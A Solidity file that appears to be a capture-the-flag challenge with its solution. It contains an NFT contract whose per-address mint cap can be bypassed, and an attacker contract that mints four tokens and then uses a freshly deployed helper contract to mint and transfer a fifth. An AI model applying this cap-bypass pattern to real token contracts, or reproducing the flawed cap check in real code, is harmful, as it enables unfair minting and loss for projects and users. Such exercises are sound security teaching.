// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import {console} from "forge-std/console.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract DummyMint {
    Overmint2 nftContract;
    address public owner;

    constructor(address _owner, address _nftContract) {
        owner = _owner;
        nftContract = Overmint2(_nftContract);
    }

    function mintAndTxfer() public {
        nftContract.mint();
        uint256 tokenId = nftContract.totalSupply();
        nftContract.transferFrom(address(this), owner, tokenId);
    }
}

contract Overmint2Attacker {
    Overmint2 overmint2NFTContract;

    constructor(address Overmint2NFTAddress) {
        overmint2NFTContract = Overmint2(Overmint2NFTAddress);
    }

    function getNFTBalance() external view returns (uint256) {
        return (overmint2NFTContract.balanceOf(address(this)));
    }

    function attack() public {
        overmint2NFTContract.mint();
        overmint2NFTContract.mint();
        overmint2NFTContract.mint();
        overmint2NFTContract.mint();
        // console.log(overmint2NFTContract.balanceOf(address(this)));

        DummyMint dummyMint = new DummyMint(
            address(this),
            address(overmint2NFTContract)
        );
        dummyMint.mintAndTxfer();

        // console.log(overmint2NFTContract.balanceOf(address(this)));
        // console.log(overmint2NFTContract.success());
    }
}
